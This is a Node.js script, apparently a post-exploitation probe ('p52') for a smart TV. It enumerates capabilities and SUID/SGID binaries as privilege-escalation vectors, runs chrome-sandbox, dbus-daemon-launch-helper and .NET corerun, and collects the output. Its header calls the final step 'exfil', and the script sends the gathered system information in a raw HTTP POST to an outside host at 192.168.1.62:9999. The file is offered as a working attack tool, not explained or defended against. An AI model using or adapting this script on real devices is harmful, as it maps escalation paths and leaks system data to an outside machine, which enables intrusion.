"use strict";

/* p52: capability confirmation + remaining SUID vectors
   1. cap tools present? (getcap / capsh)
   2. getcap on every SUID / dotnet binary  -> the decisive cap read
   3. chrome-sandbox : file + ls -laZ + run (short timeout)
   4. dbus-daemon-launch-helper : file + ls -laZ + run
   5. dotnet runtime: corerun path/version, shared dir, any .NET app on TV
   6. SUID/SGID rescan with -ls (catch files find -perm missed)
   exfil /p52info
*/

var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var R = { ts: new Date().toISOString(), probe: 'p52', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(90000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 240000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p52info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs) {
  try {
    var out = cp.execSync(cmd, { timeout: timeoutMs || 25000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
    return '[exit 0] ' + out;
  } catch (e) {
    var o = '';
    if (e.stdout) o += e.stdout.toString();
    if (e.stderr) o += (o ? '\n' : '') + e.stderr.toString();
    return '[exit ' + (e.status === undefined ? '?' : e.status) + '] ' + (o || (e && e.message) || 'unknown').substring(0, 8000);
  }
}

function runDirect(file, args, timeoutMs) {
  try {
    var r = cp.spawnSync(file, args, { timeout: timeoutMs || 8000, maxBuffer: 4 * 1024 * 1024 });
    var out = '';
    if (r.stdout) out += 'OUT: ' + r.stdout.toString();
    if (r.stderr) out += ' ERR: ' + r.stderr.toString();
    out += ' [exit ' + (r.status === null ? 'null' : r.status) + ']';
    if (r.error) out += ' [spawnErr ' + r.error.message + ']';
    return out.substring(0, 6000);
  } catch (e) { return 'ERR ' + e.message; }
}

function main() {
  R.results.identity = run('id 2>&1', 10000);

  // 1) cap tools
  R.results.cap_tools = run('which getcap capsh 2>&1; echo ---; ls -la /usr/bin/getcap /usr/bin/capsh 2>&1', 15000);

  // 2) getcap on all candidates
  R.results.getcap = run(
    'echo ===DOTNET===; getcap /usr/bin/dotnet-launcher 2>&1; ' +
    'echo ===CORERUN===; getcap /usr/share/dotnet/shared/Microsoft.NETCore.App/2.0.0/corerun 2>&1; getcap /usr/bin/dotnet 2>&1; getcap /usr/bin/dotnet-host 2>&1; ' +
    'echo ===WASUTILITY===; getcap /usr/bin/wasutility 2>&1; ' +
    'echo ===RAS===; getcap /usr/bin/RunningAppsService 2>&1; ' +
    'echo ===CHROME===; getcap /usr/lib/chromium-efl/chrome-sandbox 2>&1; ' +
    'echo ===DBUS===; getcap /usr/lib/dbus/dbus-daemon-launch-helper 2>&1', 25000
  );

  // 3) chrome-sandbox
  R.results.chrome = run('file /usr/lib/chromium-efl/chrome-sandbox 2>&1; echo ===LS===; ls -laZ /usr/lib/chromium-efl/chrome-sandbox 2>&1; echo ===STR===; strings /usr/lib/chromium-efl/chrome-sandbox 2>/dev/null | grep -iE "sandbox|seccomp|namespace|unshare|clone|user_|cap_|setuid|getuid|/proc|/opt|/home|journal|dbspace|app-context" | head -40', 20000);
  R.results.chrome_run = runDirect('/usr/lib/chromium-efl/chrome-sandbox', [], 6000);

  // 4) dbus helper
  R.results.dbus = run('file /usr/lib/dbus/dbus-daemon-launch-helper 2>&1; echo ===LS===; ls -laZ /usr/lib/dbus/dbus-daemon-launch-helper 2>&1; echo ===STR===; strings /usr/lib/dbus/dbus-daemon-launch-helper 2>/dev/null | grep -iE "dbus|launch|helper|setuid|user|/var/run|/run|socket|pid" | head -30', 20000);
  R.results.dbus_run = runDirect('/usr/lib/dbus/dbus-daemon-launch-helper', [], 6000);

  // 5) dotnet runtime details
  R.results.dotnet_rt = run(
    'echo ===CORERUN===; ls -laZ /usr/share/dotnet/shared/Microsoft.NETCore.App/2.0.0/corerun 2>&1; ' +
    'echo ===VER===; ls -la /usr/share/dotnet/shared/Microsoft.NETCore.App/ 2>&1; ' +
    'echo ===DOTNET_BIN===; ls -la /usr/bin/dotnet* 2>&1; ' +
    'echo ===APPS===; find /opt/usr/apps -maxdepth 3 -name "*.dll" 2>/dev/null | head -20; ' +
    'echo ===CORERUN_RUN===; /usr/share/dotnet/shared/Microsoft.NETCore.App/2.0.0/corerun 2>&1 | head -10; echo cr_exit=$?', 25000
  );

  // 6) SUID/SGID rescan with -ls
  R.results.suid_rescan = run('find /usr/bin /bin /usr/sbin /sbin /usr/lib -type f \\( -perm -4000 -o -perm -2000 \\) -ls 2>/dev/null | head -60', 40000);

  R.results.final = 'done ' + new Date().toISOString();
  L('done ' + new Date().toISOString());
  postFinal();
  setTimeout(postFinal, 15000);
}

try { main(); } catch (e) { R.results.fatal = String(e) + ' | ' + (e.stack || 'no-stack'); postFinal(); }
